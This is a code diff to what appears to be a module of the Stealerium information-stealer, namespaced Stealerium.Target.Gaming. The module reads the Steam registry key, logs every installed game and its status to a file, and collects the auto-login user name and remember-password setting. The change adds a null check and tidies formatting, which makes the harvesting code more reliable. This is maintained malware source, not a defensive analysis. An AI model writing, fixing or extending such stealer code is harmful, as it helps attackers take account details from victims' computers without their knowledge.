@@ -19,18 +19,22 @@ namespace Stealerium.Target.Gaming
 
             Directory.CreateDirectory(sSavePath);
 
+            var rkApps = rkSteam.OpenSubKey("Apps");
+
             try
             {
+                if (rkApps == null)
+                    return Logging.Log("Steam >> Application path not found in registry", false);
                 // Get steam applications list
-                foreach (var gameId in rkSteam.OpenSubKey("Apps").GetSubKeyNames())
+                foreach (var gameId in rkApps.GetSubKeyNames())
                     using (var app = rkSteam.OpenSubKey("Apps\\" + gameId))
                     {
                         if (app == null) continue;
-                        var name = (string) app.GetValue("Name");
+                        var name = (string)app.GetValue("Name");
                         name = string.IsNullOrEmpty(name) ? "Unknown" : name;
-                        var installed = (int) app.GetValue("Installed") == 1 ? "Yes" : "No";
-                        var running = (int) app.GetValue("Running") == 1 ? "Yes" : "No";
-                        var updating = (int) app.GetValue("Updating") == 1 ? "Yes" : "No";
+                        var installed = (int)app.GetValue("Installed") == 1 ? "Yes" : "No";
+                        var running = (int)app.GetValue("Running") == 1 ? "Yes" : "No";
+                        var updating = (int)app.GetValue("Updating") == 1 ? "Yes" : "No";
 
                         File.AppendAllText(sSavePath + "\\Apps.txt",
                             $"Application {name}\n\tGameID: {gameId}\n\tInstalled: {installed}\n\tRunning: {running}\n\tUpdating: {updating}\n\n");
@@ -76,7 +80,7 @@ namespace Stealerium.Target.Gaming
 
             try
             {
-                var rememberPassword = (int) rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
+                var rememberPassword = (int)rkSteam.GetValue("RememberPassword") == 1 ? "Yes" : "No";
                 var sSteamInfo = string.Format(
                     "Autologin User: " + rkSteam.GetValue("AutoLoginUser") +
                     "\nRemember password: " + rememberPassword
